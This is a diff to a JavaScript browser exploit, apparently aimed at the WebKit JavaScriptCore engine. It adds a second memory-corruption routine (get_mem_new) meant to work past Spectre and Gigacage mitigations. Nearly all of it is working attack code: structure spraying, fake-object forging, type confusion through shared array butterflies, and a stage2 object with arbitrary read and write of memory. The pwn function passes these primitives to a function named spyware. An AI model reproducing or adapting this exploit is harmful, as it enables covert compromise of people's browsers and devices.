@@ -99,6 +99,21 @@ function pwn(binary) {
     // Sanity check
     stage1.test()
 
+    var memory = get_mem_old(stage1);
+
+    var addrfake
+    if (memory.hasOwnProperty('fakeobj') && memory.hasOwnProperty('addrof')) {
+        addrfake = memory
+    } else {
+        addrfake = stage1
+    }
+
+    spyware(addrfake, memory, binary);
+}
+
+
+function get_mem_old(stage1) {
+    // Pre spectre & pre gigacage
     var structs = [];
     function sprayStructures() {
         // The StructureIDTable can contain holes (these contain the index of the next free slot,
@@ -223,7 +238,182 @@ function pwn(binary) {
     // The fake array itself is rooted by the memory object (closures).
     fakearray.container = container;
 
-    spyware(stage1, memory, binary);
+    return memory
+}
+
+function get_mem_new(stage1) {
+    // post spectre & gigacage compatible
+    // however, memory rw is backed by normal js objects and not typed
+    // arrays, and is less reliable
+
+    // "normal" arrays store values in butterfly, and typed arrays store
+    // their values in m_vector.
+    // butterfly is not cached, but vector is -- so until gigacage is
+    // killed old-style typed arrays can't be used for rw primitive
+
+    // first property offset
+    var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
+
+    var structure_spray = []
+    for (var i = 0; i < 1000; ++i) {
+        // last property is 0xfffffff because we want that value to
+        // preceed the manager, so when manager gets reused as
+        // butterfly, it's vectorLength is big enough
+        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
+        ary['prop'+i] = 1
+        structure_spray.push(ary)
+    }
+
+    var manager = structure_spray[500]
+    var leak_addr = stage1.addrof(manager)
+    //print('leaking from: '+ hex(leak_addr))
+
+    // properties are stored in butterfly to the right of pointer
+    // so when we create a fake object with butterfly pointing to
+    // manager, we would be only able to access memory which lies after
+    // the manager, since we can't reliably access properties: we don't
+    // even know structure layout we'd end up using, see get_mem_old's
+    // instanceof loop for more info
+    function alloc_above_manager(expr) {
+        var res
+        do {
+            for (var i = 0; i < ALLOCS; ++i) {
+                structure_spray.push(eval(expr))
+            }
+            res = eval(expr)
+        } while (stage1.addrof(res) < leak_addr)
+        return res
+    }
+
+    var unboxed_size = 100
+
+    // Two arrays are created: unboxed and boxed
+    // their butterflies are then set to same value
+    // so unboxed[i] would point to same memory as boxed[i]
+    // this leads to easy type confusion:
+    // JSValue (inc. pointers) with floats
+    // see saelo's phrack article, look for "JSC defines a set of
+    // different indexing types".
+    // JSC sees huge array containing only floats, so they'd be stored
+    // as floats and retrived as floats, not as normal JSValue's
+    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
+    // this one would have indexing type of array with objects in it
+    var boxed = alloc_above_manager('[{}]')
+    var victim = alloc_above_manager('[]')
+
+    // Will be stored out-of-line at butterfly - 0x10
+    victim.p0 = 0x1337
+    function victim_write(val) {
+        victim.p0 = val
+    }
+    function victim_read() {
+        return victim.p0
+    }
+
+    i32[0] = 0x200                // Structure ID
+    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
+    var outer = {
+        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
+        p1: f64[0],
+        p2: manager,
+        // parts of spectre mitigation, but just won't be used on older
+        // versions
+        p3: 0xfffffff, // Butterfly indexing mask
+    }
+
+    // this would cause p1 to be interpreted as an object
+    // with p2==manager==leak_addr being used as butterfly
+    var fake_addr = stage1.addrof(outer) + FPO + 0x8
+    //print('fake obj @ ' + hex(fake_addr))
+
+    var unboxed_addr = stage1.addrof(unboxed)
+    var boxed_addr = stage1.addrof(boxed)
+    var victim_addr = stage1.addrof(victim)
+    //print('leak ' + hex(leak_addr)
+        //+ '\nunboxed ' + hex(unboxed_addr)
+        //+ '\nboxed ' + hex(boxed_addr)
+        //+ '\nvictim ' + hex(victim_addr))
+
+    var holder = {fake: {}}
+    holder.fake = stage1.fakeobj(fake_addr)
+
+    // From here on GC would be uncool
+
+    // Share a butterfly for easier boxing/unboxing
+    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
+    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
+    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)
+
+    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
+    function set_victim_addr(where) {
+        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
+    }
+    function reset_victim_addr() {
+        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
+    }
+
+    var stage2 = {
+        addrof: function(victim) {
+            boxed[0] = victim
+            return f2i(unboxed[0])
+        },
+
+        fakeobj: function(addr) {
+            unboxed[0] = (new Int64(addr)).asDouble()
+            return boxed[0]
+        },
+
+        write64: function(where, what) {
+            set_victim_addr(where)
+            victim_write(this.fakeobj(what))
+            reset_victim_addr()
+        },
+
+        read64: function(where) {
+            set_victim_addr(where)
+            var res = this.addrof(victim_read())
+            reset_victim_addr()
+            return res
+        },
+
+        writeInt64: function(where, what) {
+            set_victim_addr(where)
+            victim_write(this.fakeobj(f2i(what.asDouble())))
+            reset_victim_addr()
+        },
+
+        readInt64: function(where) {
+            set_victim_addr(where)
+            var res = this.addrof(victim_read())
+            reset_victim_addr()
+            return new Int64(res)
+        },
+
+        read: function(addr, length) {
+            var a = new Array(length);
+            var i;
+
+            for (i = 0; i + 8 < length; i += 8) {
+                v = this.readInt64(addr + i).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = this.readInt64(addr + i).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
+        },
+
+        write: function(addr, data) {
+            throw 'maybe later'
+        },
+    }
+
+    return stage2
 }
 
 function print_error(e) {
